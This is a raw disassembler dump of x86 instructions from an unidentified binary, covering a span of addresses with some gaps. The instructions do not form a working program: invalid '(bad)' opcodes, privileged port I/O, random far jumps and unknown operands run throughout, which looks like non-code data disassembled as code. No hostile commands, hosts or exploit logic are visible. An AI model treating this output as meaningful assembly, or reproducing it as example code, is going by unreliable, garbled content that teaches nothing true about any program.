  41b17d:	stos   DWORD PTR es:[edi],eax
  41b17e:	adc    edi,DWORD PTR [edi+0x68]
  41b181:	adc    DWORD PTR [eax-0x5f],edi
  41b184:	jl     0x41b179
  41b186:	arpl   WORD PTR [edi+0x537dfc51],bp
  41b18c:	ret    0xd62e
  41b18f:	enter  0x9a8f,0x2c
  41b193:	adc    eax,0x1938efad
  41b198:	int    0x2b
  41b19a:	test   BYTE PTR [esi+0x7f],0xba
  41b19e:	mov    dh,0x96
  41b1a0:	ins    DWORD PTR es:[edi],dx
  41b1a1:	fs and eax,0xdab21cf3
  41b1a7:	mov    WORD PTR [ebx],?
  41b1a9:	pop    ecx
  41b1aa:	add    ecx,DWORD PTR [edi-0xb]
  41b1ad:	xor    eax,0xfb53d3d1
  41b1b2:	jp     0x41b15e
  41b1b4:	jbe    0x41b173
  41b1b6:	mov    esp,0x55148811
  41b1bb:	or     DWORD PTR [edx+0x2f91a7d8],0x57
  41b1c2:	loop   0x41b14d
  41b1c4:	xor    eax,0x7909941d
  41b1c9:	repz cwde 
  41b1cb:	inc    ebx
  41b1cc:	adc    cl,BYTE PTR [ebx]
  41b1ce:	cmp    BYTE PTR [edx-0x2a2c3419],0x60
  41b1d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1d6:	test   DWORD PTR [edx-0x49],0x1be2cfb8
  41b1dd:	pop    ebx
  41b1de:	iret   
  41b1df:	push   eax
  41b1e0:	outs   dx,BYTE PTR ds:[esi]
  41b1e1:	xchg   esp,esi
  41b1e3:	sub    DWORD PTR [eax-0x48],esi
  41b1e6:	outs   dx,BYTE PTR ds:[esi]
  41b1e7:	mov    ch,0x3e
  41b1e9:	out    0xa5,al
  41b1eb:	sahf   
  41b1ec:	loop   0x41b1f6
  41b1ee:	retf   0x92bd
  41b1f1:	mov    dh,0xbd
  41b1f3:	mov    ebp,esi
  41b1f5:	les    edi,FWORD PTR [esi]
  41b1f7:	enter  0x867f,0x3a
  41b1fb:	retf   0x18f4
  41b1fe:	or     dh,bl
  41b200:	scas   al,BYTE PTR es:[edi]
  41b201:	mov    WORD PTR [edi+ebx*8-0x1e83b4b9],?
  41b208:	ins    BYTE PTR es:[edi],dx
  41b209:	sbb    DWORD PTR [ebx+0x28],edx
  41b20c:	mov    ah,0x55
  41b20e:	jg     0x41b244
  41b210:	popf   
  41b211:	add    BYTE PTR ds:[esi+ebx*1-0x49],bl
  41b216:	push   es
  41b217:	adc    dh,dh
  41b219:	(bad)  
  41b21b:	sbb    BYTE PTR [edx+0x22],dl
  41b21e:	adc    eax,0x8d7330ac
  41b223:	jbe    0x41b26c
  41b225:	push   ebx
  41b226:	cmp    cl,BYTE PTR [ebp+esi*2-0x1]
  41b22a:	ret    
  41b22b:	ins    DWORD PTR es:[edi],dx
  41b22c:	repz out dx,al
  41b22e:	leave  
  41b22f:	das    
  41b230:	jg     0x41b2a3
  41b232:	(bad)  
  41b233:	xchg   esp,eax
  41b234:	xor    BYTE PTR [esp+ebp*2],ah
  41b237:	mov    esp,0xd0a0f027
  41b23c:	popa   
  41b23d:	mov    edx,0x4363ce5b
  41b242:	mov    eax,0xab043395
  41b247:	mov    al,0x6d
  41b249:	ins    DWORD PTR es:[edi],dx
  41b24a:	jb     0x41b1ed
  41b24c:	inc    esp
  41b24d:	scas   al,BYTE PTR es:[edi]
  41b24e:	or     DWORD PTR [esi-0x6fa017fe],ecx
  41b254:	mov    ss,esi
  41b256:	dec    esi
  41b257:	dec    esp
  41b258:	sub    ecx,esi
  41b25a:	adc    ah,0x4b
  41b25d:	and    eax,0xe15d8328
  41b262:	fist   DWORD PTR [ebx+edx*2]
  41b265:	mov    BYTE PTR ds:0x2c16f792,dh
  41b26b:	lods   eax,DWORD PTR ds:[esi]
  41b26c:	push   ebx
  41b26d:	ins    BYTE PTR es:[edi],dx
	...
  41b2d6:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     BYTE PTR [edx+0x6719400e],ch
  41b2e7:	and    al,0x1
  41b2e9:	add    BYTE PTR [eax],al
  41b2eb:	add    DWORD PTR [eax],eax
  41b2ed:	add    cl,bl
  41b2ef:	ret    0x4fd
  41b2f2:	push   edx
  41b2f3:	dec    edx
  41b2f4:	das    
  41b2f5:	or     BYTE PTR [ebp-0x3],dl
  41b2f8:	sar    BYTE PTR [edx+0x26],1
  41b2fb:	xlat   BYTE PTR ds:[ebx]
  41b2fc:	sbb    eax,0x7f489729
  41b301:	sar    ah,1
  41b303:	jp     0x41b353
  41b305:	bound  edx,QWORD PTR [eax]
  41b307:	out    0x91,eax
  41b309:	push   ds
  41b30a:	mov    al,ds:0xb7792a54
  41b30f:	iret   
  41b310:	inc    esi
  41b311:	add    eax,0xc45db35d
  41b316:	add    DWORD PTR gs:[ecx+esi*8+0x6388a122],esi
  41b31e:	es push ebx
  41b320:	jmp    FWORD PTR [edi+eiz*1+0x29]
  41b324:	jecxz  0x41b2d0
  41b326:	cmp    ebx,DWORD PTR ds:0xa40ba091
  41b32c:	out    dx,eax
  41b32d:	lods   eax,DWORD PTR ds:[esi]
  41b32e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b32f:	dec    ebp
  41b330:	push   ecx
  41b331:	cmp    al,0xf
  41b333:	add    eax,0x531e0623
  41b338:	mov    eax,0x9f9cd137
  41b33d:	add    cl,BYTE PTR [edi+0x7cdc39a6]
  41b343:	xor    bh,BYTE PTR [ecx+0x245d7913]
  41b349:	sbb    al,0x3f
  41b34b:	pop    ss
  41b34c:	push   eax
  41b34d:	push   esp
  41b34e:	div    BYTE PTR [ecx-0x13753af4]
  41b354:	fwait
  41b355:	mov    bh,0x9a
  41b357:	jbe    0x41b391
  41b359:	jle    0x41b3c0
  41b35b:	int3   
  41b35c:	pop    eax
  41b35d:	stos   BYTE PTR es:[edi],al
  41b35e:	cmp    al,0x92
  41b360:	or     BYTE PTR [esp+eiz*4+0x71e7aec2],0x53
  41b368:	mov    bl,0xf1
  41b36a:	sub    BYTE PTR fs:[edi+0x22],ch
  41b36e:	loopne 0x41b31f
  41b370:	mov    DWORD PTR [eax+0x42],edi
  41b373:	in     eax,0xc3
  41b375:	pop    eax
  41b376:	cli    
  41b377:	stc    
  41b378:	ja     0x41b38d
  41b37a:	jle    0x41b382
  41b37c:	out    0x6e,al
  41b37e:	mov    cl,0xdd
  41b380:	cld    
  41b381:	cs in  al,0x12
  41b384:	xor    al,0x52
  41b386:	pop    ecx
  41b387:	cmp    BYTE PTR [edi+0x5a40fd41],0xd9
  41b38e:	jmp    0xfacb8db6
  41b393:	(bad)  
  41b394:	call   0x97292279
  41b399:	mov    eax,ds:0xe934534c
  41b39e:	mov    dh,0xcc
  41b3a0:	sub    eax,0x83f1617e
  41b3a5:	lea    edx,[ecx+0x271ce9e6]
  41b3ab:	clc    
  41b3ac:	cmp    al,0x51
  41b3ae:	mov    esi,0xf1c594f1
  41b3b3:	push   esi
  41b3b4:	cs pop ebp
  41b3b6:	out    dx,eax
  41b3b7:	jmp    0xaade:0xa6ee2251
  41b3be:	cmp    cl,BYTE PTR [edi-0x1f08435]
  41b3c4:	cmp    dl,dl
  41b3c6:	cwde   
  41b3c7:	test   eax,0x37705892
  41b3cc:	pop    ebx
  41b3cd:	inc    eax
  41b3ce:	faddp  st(5),st
  41b3d0:	in     eax,dx
  41b3d1:	xor    edi,eax
  41b3d3:	add    BYTE PTR [ecx],al
  41b3d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3d6:	xor    esp,DWORD PTR [ecx]
  41b3d8:	mov    eax,0xa3fb9576
  41b3dd:	xlat   BYTE PTR ds:[ebx]
  41b3de:	cmc    
  41b3df:	shr    DWORD PTR ds:0x28745c13,0x4d
  41b3e6:	and    ah,bh
  41b3e8:	pop    edi
  41b3e9:	(bad)  
  41b3ea:	or     edi,DWORD PTR [edi+0x1b]
  41b3ed:	cmp    BYTE PTR [eax],al
	...
  41b453:	add    BYTE PTR [eax],al
  41b455:	add    BYTE PTR [eax+0xd],cl
  41b458:	sbb    eax,0xfebb5dab
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b463:	lock call 0x1671c09
  41b469:	add    BYTE PTR [eax],al
  41b46b:	add    DWORD PTR [eax],eax
  41b46d:	add    ch,al
  41b46f:	hlt    
  41b470:	shl    DWORD PTR [esi+ebx*1],0xf6
  41b474:	cmp    eax,0x6d60db1c
  41b47a:	nop
  41b47b:	pop    edx
  41b47c:	adc    ebp,DWORD PTR [edi-0xed0d409]
  41b482:	add    edi,DWORD PTR [ebp-0x4d]
  41b485:	mov    esp,0xcc07ba97
  41b48a:	inc    ecx
  41b48b:	xchg   BYTE PTR [esi+ebp*8-0x6d20fbb7],ah
  41b492:	push   cs
  41b493:	popf   
  41b494:	mov    ?,ebx
  41b496:	hlt    
  41b497:	loopne 0x41b474
  41b499:	push   edx
  41b49a:	push   ebp
  41b49b:	sbb    al,0xa8
  41b49d:	mov    esi,0x8a7b9a65
  41b4a2:	fnsave [ecx+0x24f00627]
  41b4a8:	shl    DWORD PTR [ecx-0x41],1
  41b4ab:	push   ecx
  41b4ac:	aad    0xba
  41b4ae:	and    al,0xd2
  41b4b0:	xchg   edi,eax
  41b4b1:	jl     0x41b4e1
  41b4b3:	xor    al,0x5b
  41b4b5:	mov    ebp,0x35e4a16a
  41b4ba:	cmp    al,0xcf
  41b4bc:	mov    eax,ds:0x9fed686
  41b4c1:	mov    ebx,0xc8fcea3a
  41b4c6:	pop    ds
  41b4c7:	adc    esi,DWORD PTR [eax+0x771e9bf2]
  41b4cd:	test   eax,0x78cd2f37
  41b4d2:	popf   
  41b4d3:	shl    BYTE PTR [ecx],0xf7
  41b4d6:	jecxz  0x41b4e8
  41b4d8:	mov    cl,0x7e
  41b4da:	sub    BYTE PTR [ecx],ch
  41b4dc:	js     0x41b51b
  41b4de:	mov    gs,WORD PTR gs:[edi]
  41b4e1:	std    
  41b4e2:	sbb    DWORD PTR [edx-0x6c],eax
  41b4e5:	fcmovu st,st(4)
  41b4e7:	cmp    eax,0xd1d27c1c
  41b4ec:	(bad)  
  41b4ed:	and    al,0xa0
  41b4ef:	mov    ds:0xb59e65cc,al
  41b4f4:	out    dx,al
  41b4f5:	mov    ah,0xa6
  41b4f7:	mov    eax,0xf4592038
  41b4fc:	ins    DWORD PTR es:[edi],dx
  41b4fd:	push   cs
  41b4fe:	retf   
  41b4ff:	in     al,0x1
  41b501:	mov    esp,0x17780542
  41b506:	xchg   ecx,eax
  41b507:	shl    BYTE PTR [esi+0x31e26928],1
  41b50d:	rcl    BYTE PTR [edi],0x0
  41b510:	adc    DWORD PTR [esi+eax*1],edi
  41b513:	lods   eax,DWORD PTR ds:[esi]
  41b514:	lea    ebx,[ebp-0x30]
  41b517:	dec    ecx
  41b518:	cmp    al,0x0
  41b51a:	mov    ?,esp
  41b51c:	pop    esi
  41b51d:	std    
  41b51e:	mov    DWORD PTR [eax-0x294947e8],esp
  41b524:	xchg   ebp,eax
  41b525:	lds    esp,FWORD PTR [eax]
  41b527:	adc    DWORD PTR [edx+edi*1-0x7a],eax
  41b52b:	in     al,0xb3
  41b52d:	jmp    0x84248848
  41b532:	outs   dx,DWORD PTR ds:[esi]
  41b533:	sbb    al,0x8d
  41b535:	rol    BYTE PTR [eax+0xb],0xec
  41b539:	aas    
  41b53a:	mov    BYTE PTR [ecx-0x41bccda7],dl
  41b540:	jno    0x41b4dd
  41b542:	fsub   QWORD PTR [ecx+0x1bf1c3a8]
  41b548:	ss xchg esi,eax
  41b54a:	daa    
  41b54b:	out    dx,eax
  41b54c:	push   es
  41b54d:	cwde   
  41b54e:	retf   
  41b54f:	sub    al,0x31
  41b551:	es das 
  41b553:	jbe    0x41b4d8
  41b555:	mov    ss,WORD PTR [edx-0x29]
  41b558:	push   cs
  41b559:	int    0xc
  41b55b:	pop    ds
  41b55c:	cli    
  41b55d:	push   edx
  41b55e:	ret    0x4d7a
  41b561:	adc    dh,dl
  41b563:	pmaddwd mm7,QWORD PTR [esi]
  41b566:	daa    
  41b567:	pusha  
  41b568:	add    BYTE PTR [ecx-0x7a],ah
  41b56b:	fisttp QWORD PTR [eax]
  41b56d:	das    
	...
  41b5d6:	aam    0xec
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	in     al,0x2f
  41b5e4:	push   es
  41b5e5:	imul   esp,DWORD PTR [edi+0x26],0x1000001
  41b5ec:	add    BYTE PTR [eax],al
  41b5ee:	mov    bh,0x85
  41b5f0:	loope  0x41b628
  41b5f2:	mov    bl,0xe2
  41b5f4:	or     cl,bh
  41b5f6:	xor    BYTE PTR [esi-0x20],al
  41b5f9:	mov    al,ds:0x6d722d68
  41b5fe:	push   es
  41b5ff:	jbe    0x41b5d2
  41b601:	mov    DWORD PTR fs:[ecx],edi
  41b604:	adc    DWORD PTR [edx+edi*4+0x44c5b33],edx
  41b60b:	xchg   ebp,eax
  41b60c:	push   esp
  41b60d:	push   esp
  41b60e:	lds    esp,FWORD PTR [ebx-0x70]
  41b611:	xchg   cx,ax
  41b613:	mov    eax,0x6416187a
  41b618:	popa   
  41b619:	retf   
  41b61a:	jmp    0x41b618
  41b61c:	cmp    al,0x30
  41b61e:	dec    esp
  41b61f:	inc    esp
  41b620:	ins    DWORD PTR es:[edi],dx
  41b621:	and    BYTE PTR [esi-0x61],ah
  41b624:	inc    edi
  41b625:	mov    bh,0x60
  41b627:	dec    ebx
  41b628:	mov    BYTE PTR [esi],bl
  41b62a:	gs xor eax,0xea77f16d
  41b630:	out    0xf6,al
  41b632:	arpl   WORD PTR [edi],dx
  41b634:	stc    
  41b635:	jmp    FWORD PTR [eax-0x4]
  41b638:	mov    al,ds:0xc379ea83
  41b63d:	not    BYTE PTR [ecx-0x8]
  41b640:	push   0x335565b3
  41b645:	sahf   
  41b646:	call   0x193f3815
  41b64b:	cmp    DWORD PTR [edx+0x92f72fc],esp
  41b651:	jg     0x41b6c6
  41b653:	xor    BYTE PTR [ebx+ebp*2+0x291a113d],ch
  41b65a:	pop    ebp
  41b65b:	imul   esp
  41b65d:	pop    es
  41b65e:	add    ch,bh
  41b660:	xor    DWORD PTR [ebx+0x25],esp
  41b663:	push   ecx
  41b664:	lods   eax,DWORD PTR ds:[esi]
  41b665:	cdq    
  41b666:	dec    esp
  41b667:	jecxz  0x41b652
  41b669:	inc    ecx
  41b66a:	pusha  
  41b66b:	fst    st(6)
  41b66d:	or     dl,dh
  41b66f:	(bad)  
  41b670:	xlat   BYTE PTR ds:[ebx]
  41b671:	sub    ecx,edi
  41b673:	js     0x41b680
  41b675:	mov    dl,0xf0
  41b677:	mov    ds:0x4a6ff5f4,al
  41b67c:	into   
  41b67d:	pop    edx
  41b67e:	iret   
  41b67f:	and    ch,al
  41b681:	cs aas 
  41b683:	data16 add dh,dl
  41b686:	adc    DWORD PTR [edi+0x33],eax
  41b689:	scas   al,BYTE PTR es:[edi]
  41b68a:	stc    
  41b68b:	and    DWORD PTR [edx-0x35],ebx
  41b68e:	daa    
  41b68f:	gs add dh,dl
  41b692:	jmp    0x57a4910c
  41b697:	dec    esp
  41b698:	mov    edi,DWORD PTR [esi+0x1b5083f2]
  41b69e:	sbb    BYTE PTR [esi-0x50f15077],0x4a
  41b6a5:	(bad)  
  41b6a6:	and    DWORD PTR [ecx+0x1a727479],0xfffffffa
  41b6ad:	mov    ecx,0xbf091024
  41b6b2:	sahf   
  41b6b3:	mov    ecx,0x5d3c9880
  41b6b8:	(bad)  
  41b6b9:	xchg   ecx,eax
  41b6ba:	dec    edi
  41b6bb:	lods   eax,DWORD PTR ds:[esi]
  41b6bc:	nop
  41b6bd:	cmp    bl,BYTE PTR [edi]
  41b6bf:	inc    ebp
  41b6c0:	aad    0xa7
  41b6c2:	addr16 into 
  41b6c4:	call   0x9e52:0x9af8c3ba
  41b6cb:	sub    al,0x90
  41b6ce:	in     eax,dx
  41b6cf:	aam    0x3e
  41b6d1:	add    al,0xec
  41b6d3:	mov    bh,0x26
  41b6d5:	ins    BYTE PTR es:[edi],dx
  41b6d6:	sbb    ecx,edx
  41b6d8:	(bad)  
  41b6d9:	pop    ecx
  41b6da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6db:	xlat   BYTE PTR ds:[ebx]
  41b6dc:	ret    0xa2e8
  41b6df:	mov    sp,cx
  41b6e2:	call   0x4ca9c757
  41b6e7:	enter  0x3b4a,0xe2
  41b6eb:	lock xchg esp,eax
  41b6ed:	in     al,dx
	...
  41b756:	test   al,0x63
  41b758:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b75e:	sti    
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	int    0x41
  41b764:	sub    BYTE PTR [ebp+0x67],ah
  41b767:	daa    
  41b768:	add    DWORD PTR [eax],eax
  41b76a:	add    BYTE PTR [ecx],al
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	paddq  mm7,QWORD PTR [esi]
  41b771:	sar    esp,1
  41b773:	pop    ebp
  41b774:	enter  0xe346,0xad
  41b778:	pushf  
  41b779:	idiv   esp
  41b77b:	mov    dh,0x4
  41b77d:	push   edi
  41b77e:	mov    cl,0x3e
  41b780:	mov    bh,0x35
  41b782:	(bad)  
  41b783:	dec    ebx
  41b784:	out    0x75,eax
  41b786:	pushf  
  41b787:	iret   
  41b788:	mov    esp,0xfb375f6e
  41b78d:	pop    eax
  41b78e:	fild   QWORD PTR [ebx]
  41b790:	jb     0x41b77f
  41b792:	mov    ecx,0xdbabb7bf
  41b797:	and    DWORD PTR [eax+0x21],esi
  41b79a:	rcr    DWORD PTR [edx+0x5c],0x2c
  41b79e:	aaa    
  41b79f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7a0:	popf   
  41b7a1:	sbb    ebx,DWORD PTR [edx+edx*2-0x32]
  41b7a5:	xor    BYTE PTR [esi-0x4c],bl
  41b7a8:	pop    esp
  41b7a9:	adc    ch,BYTE PTR [ebp+0x73]
  41b7ac:	xchg   ebp,eax
  41b7ad:	loop   0x41b742
  41b7af:	int    0x70
  41b7b1:	out    dx,al
  41b7b2:	push   ss
  41b7b3:	adc    DWORD PTR [esi-0x574e19fd],edx
  41b7b9:	imul   esp,DWORD PTR [edi+ecx*8+0x6],0x29a5e5c5
  41b7c1:	dec    ebp
  41b7c2:	sti    
  41b7c3:	ror    bh,cl
  41b7c5:	lea    ebp,[ecx]
  41b7c7:	jo     0x41b751
  41b7c9:	in     eax,0x4f
  41b7cb:	or     eax,DWORD PTR [ecx]
  41b7cd:	push   eax
  41b7ce:	push   esi
  41b7cf:	dec    eax
  41b7d0:	push   0xe6f2afe9
  41b7d5:	mov    dh,0x9f
  41b7d7:	(bad)  
  41b7d9:	cwde   
  41b7da:	or     DWORD PTR [edx-0x53aa2757],eax
  41b7e0:	pop    ebp
  41b7e1:	push   0xb857d957
  41b7e6:	inc    ebp
  41b7e7:	shr    cl,cl
  41b7e9:	cmp    BYTE PTR [eax-0x71],bh
  41b7ec:	xchg   edi,eax
  41b7ed:	pop    ds
  41b7ee:	(bad)  
  41b7ef:	ja     0x41b824
  41b7f1:	(bad)  
  41b7f2:	cdq    
  41b7f3:	inc    edx
  41b7f4:	push   esi
  41b7f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7f6:	mov    bl,BYTE PTR [edx+0x63d753be]
  41b7fc:	enter  0xd8f7,0xe3
  41b800:	mov    bh,0x69
  41b802:	rcr    BYTE PTR [edx],cl
  41b804:	dec    ebp
  41b805:	jecxz  0x41b81f
  41b807:	in     al,0xde
  41b809:	(bad)  
  41b80a:	jp     0x41b7cf
  41b80c:	xchg   edi,eax
  41b80d:	jl     0x41b7db
  41b80f:	shl    DWORD PTR [ebx],cl
  41b811:	les    ebx,FWORD PTR [ecx-0xc8e625c]
  41b817:	jmp    0x8cac589e
  41b81c:	jmp    0x41b858
  41b81e:	cmc    
  41b81f:	ficom  WORD PTR [edx-0x40]
  41b822:	xchg   DWORD PTR [esi],ebp
  41b824:	ja     0x41b7f8
  41b826:	adc    esi,DWORD PTR [ebx]
  41b828:	ret    
  41b829:	xchg   ecx,eax
  41b82a:	add    BYTE PTR [edi-0x56],cl
  41b82d:	iret   
  41b82e:	mov    ds:0x8f32260b,al
  41b833:	jp     0x41b886
  41b835:	ja     0x41b84a
  41b837:	cs push ds
  41b839:	inc    ebx
  41b83a:	push   ss
  41b83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b83c:	jl     0x41b895
  41b83e:	cs jnp 0x41b7db
  41b841:	fwait
  41b842:	cmp    BYTE PTR [eax-0x1a7411b4],bh
  41b848:	sub    dh,BYTE PTR [ebx+0x14555af5]
  41b84e:	pop    ds
  41b84f:	in     eax,dx
  41b850:	cmp    al,0xda
  41b852:	mov    al,ds:0xdf597dc4
  41b857:	les    ebx,FWORD PTR [ebx+0x6f]
  41b85a:	jbe    0x41b7e0
  41b85c:	push   eax
  41b85d:	pop    edx
  41b85e:	lods   al,BYTE PTR ds:[esi]
  41b85f:	jge    0x41b8ad
  41b861:	retf   0xbd6a
  41b864:	inc    ecx
  41b865:	outs   dx,BYTE PTR ds:[esi]
  41b866:	add    DWORD PTR cs:[esi+0x11],esp
  41b86a:	jo     0x41b879
  41b86c:	lods   al,BYTE PTR ds:[esi]
  41b86d:	dec    ebx
	...
  41b8d6:	mov    bh,ah
  41b8d8:	(bad)  
  41b8d9:	dec    esi
  41b8da:	idiv   DWORD PTR [edi-0x75]
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0xd7
  41b8e3:	sub    ch,ch
  41b8e5:	scas   al,BYTE PTR es:[edi]
  41b8e6:	sub    BYTE PTR [bx+di],al
  41b8e9:	add    BYTE PTR [eax],al
  41b8eb:	add    DWORD PTR [eax],eax
  41b8ed:	add    bl,cl
  41b8ef:	dec    edi
  41b8f0:	add    eax,0xfd6570bc
  41b8f5:	shl    eax,1
  41b8f7:	cmp    eax,0x84f6939b
  41b8fc:	sbb    bh,BYTE PTR [ebx]
  41b8fe:	out    dx,eax
  41b8ff:	outs   dx,DWORD PTR ss:[esi]
  41b901:	shl    BYTE PTR [ebx],cl
  41b903:	popf   
  41b904:	js     0x41b8c4
  41b906:	or     ebx,DWORD PTR [esi-0x60]
  41b909:	jmp    0x33777e48
  41b90e:	call   0x687c3b62
  41b913:	push   0xffffffa7
  41b915:	pop    es
  41b916:	add    eax,0xd75a1cd6
  41b91b:	inc    ecx
  41b91c:	fdiv   DWORD PTR [esi-0x4312a8f9]
  41b922:	sbb    esp,ebx
  41b924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b925:	inc    esp
  41b926:	mov    ch,0x7f
  41b928:	cs stc 
  41b92a:	jae    0x41b9a2
  41b92c:	test   BYTE PTR [ebx+0x1fe1178d],ch
  41b932:	dec    esp
  41b933:	(bad)  
  41b934:	pop    ecx
  41b935:	cmc    
  41b936:	push   ebx
  41b937:	mov    bh,0x70
  41b939:	and    edi,edi
  41b93b:	not    DWORD PTR [edx]
  41b93d:	fiadd  WORD PTR [esi+0x61]
  41b940:	mov    ebx,0x7f911326
  41b945:	outs   dx,BYTE PTR ds:[esi]
  41b946:	push   ecx
  41b947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b948:	icebp  
  41b949:	out    0x32,al
  41b94b:	ds push cs
  41b94d:	pop    es
  41b94e:	shl    esp,1
  41b950:	sbb    BYTE PTR [esi+0x74],bh
  41b953:	mov    bh,BYTE PTR [ebx]
  41b955:	cld    
  41b956:	fldcw  WORD PTR [edi-0x2c66e68]
  41b95c:	sti    
  41b95d:	sbb    al,0x84
  41b95f:	cmc    
  41b960:	dec    edi
  41b961:	add    dl,BYTE PTR [eax+0x29]
  41b964:	cli    
  41b965:	xor    BYTE PTR [ebp+0x4d],bh
  41b968:	jmp    0x7814cefe
  41b96d:	mov    bh,0x79
  41b96f:	cmp    bh,BYTE PTR [edx]
  41b971:	jg     0x41b922
  41b973:	add    al,BYTE PTR [esi+edx*2-0x61241477]
  41b97a:	jp     0x41b9bb
  41b97c:	rcl    BYTE PTR [edi],cl
  41b97e:	js     0x41b9c1
  41b980:	sub    ecx,edi
  41b982:	dec    edx
  41b983:	(bad)  
  41b984:	das    
  41b985:	dec    esi
  41b986:	stc    
  41b987:	sti    
  41b988:	or     eax,0xfcf85478
  41b98d:	(bad)  
  41b98e:	cli    
  41b98f:	push   edx
  41b990:	add    eax,0xf1264b5f
  41b995:	sub    ebx,esi
  41b997:	into   
  41b998:	sub    BYTE PTR [eax+0x3783bae5],bh
  41b99e:	push   ss
  41b99f:	add    DWORD PTR [ebx+edx*2-0x7c4d0c38],edx
  41b9a6:	aam    0x76
  41b9a8:	nop
  41b9a9:	jge    0x41b994
  41b9ab:	pop    eax
  41b9ac:	fmul   st(6),st
  41b9ae:	sub    eax,0x697ea25c
  41b9b3:	repz add dl,ch
  41b9b6:	and    eax,0x7887bed6
  41b9bb:	(bad)  
  41b9bc:	aad    0xef
  41b9be:	cdq    
  41b9bf:	stc    
  41b9c0:	dec    edx
  41b9c1:	jp     0x41ba02
  41b9c3:	lea    esp,[ebx]
  41b9c5:	scas   al,BYTE PTR es:[edi]
  41b9c6:	mov    eax,ds:0x78f7b421
  41b9cb:	scas   al,BYTE PTR es:[edi]
  41b9cc:	adc    al,0x34
  41b9ce:	mov    ds:0x8cac7e56,al
  41b9d3:	mov    eax,ds:0x7be25ae5
  41b9d8:	xor    eax,0xe6c7e327
  41b9de:	mov    edi,0xca8cbffe
  41b9e3:	(bad)  
  41b9e4:	jnp    0x41b9f6
  41b9e6:	cmp    DWORD PTR [ebx],edx
  41b9e8:	sbb    al,0x27
  41b9ea:	es ins BYTE PTR es:[edi],dx
  41b9ec:	adc    BYTE PTR [ecx+0x0],ch
	...
  41ba56:	ret    
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	shl    DWORD PTR [ecx],cl
  41ba64:	into   
  41ba65:	packuswb mm5,QWORD PTR [ecx]
  41ba68:	add    DWORD PTR [eax],eax
  41ba6a:	add    BYTE PTR [ecx],al
  41ba6c:	add    BYTE PTR [eax],al
  41ba6e:	(bad)  
  41ba6f:	inc    edx
  41ba70:	push   ss
  41ba71:	je     0x41ba93
  41ba73:	mov    cs,WORD PTR [esp+ecx*4]
  41ba76:	das    
  41ba77:	in     al,0xd3
  41ba79:	pop    esp
  41ba7a:	mov    ?,WORD PTR [edx+0x7f532fe0]
  41ba80:	sbb    BYTE PTR [eax],0x27
  41ba83:	ficomp DWORD PTR [esi]
  41ba85:	aas    
  41ba86:	cwde   
  41ba87:	push   cs
  41ba88:	shld   DWORD PTR [edi+0x63],eax,0xda
  41ba8d:	xchg   edi,eax
  41ba8e:	dec    edi
  41ba8f:	cmp    eax,0x68cf71a0
  41ba94:	mov    eax,ds:0xb5ace3e3
  41ba99:	xchg   ebp,eax
  41ba9a:	pusha  
  41ba9b:	push   ecx
  41ba9c:	shr    BYTE PTR [edi+0x61],cl
  41ba9f:	mov    ds:0xe96072f,eax
  41baa4:	push   ss
  41baa5:	push   ss
  41baa6:	jl     0x41baa7
  41baa8:	and    al,0xce
  41baaa:	scas   al,BYTE PTR es:[edi]
  41baab:	or     ah,cl
  41baad:	cmp    ebx,DWORD PTR cs:[edi]
  41bab0:	add    esi,ebp
  41bab2:	lods   eax,DWORD PTR ds:[esi]
  41bab3:	vaddps xmm4,xmm6,xmm4
  41bab7:	push   ebx
  41bab8:	add    eax,0xc3423eca
  41babd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41babe:	mov    esi,0x5ac33f36
  41bac3:	(bad)  
  41bac4:	loope  0x41ba9d
  41bac6:	lea    eax,[edi+0xa367be9]
  41bacc:	shl    DWORD PTR [esi],0x5d
  41bacf:	icebp  
  41bad0:	sub    BYTE PTR [edi-0x2e],dh
  41bad3:	mov    ds:0x4edfd49,al
  41bad8:	sbb    al,0xfd
  41bada:	push   0xffffffc1
  41badc:	imul   eax,DWORD PTR [ecx+ebx*4],0x590a6195
  41bae3:	sub    al,0xbc
  41bae5:	fstp   TBYTE PTR [eax-0x7f454173]
  41baeb:	bound  ebp,QWORD PTR [ebx]
  41baed:	stos   BYTE PTR es:[edi],al
  41baee:	pop    edx
  41baef:	add    eax,0x3fc26705
  41baf4:	add    al,0xef
  41baf6:	retf   
  41baf7:	jmp    0xd737:0x24fee08d
  41bafe:	xchg   DWORD PTR [esp+ecx*8-0x2e1e40b9],ecx
  41bb05:	sub    eax,0xe6367993
  41bb0a:	sahf   
  41bb0b:	sub    BYTE PTR [esi+edx*4],dh
  41bb0e:	xchg   DWORD PTR ss:[ebp-0x60b9dba2],edi
  41bb15:	shl    DWORD PTR [edx+0x5a33ae24],1
  41bb1b:	jp     0x41bae7
  41bb1d:	sub    cl,BYTE PTR [ecx+0x5b]
  41bb20:	mov    al,0x53
  41bb22:	mov    ss,WORD PTR [edi+0x7212c8db]
  41bb28:	cmp    ecx,edi
  41bb2a:	xlat   BYTE PTR ds:[ebx]
  41bb2b:	xor    DWORD PTR [ebx+0x2d77eadf],ecx
  41bb31:	leave  
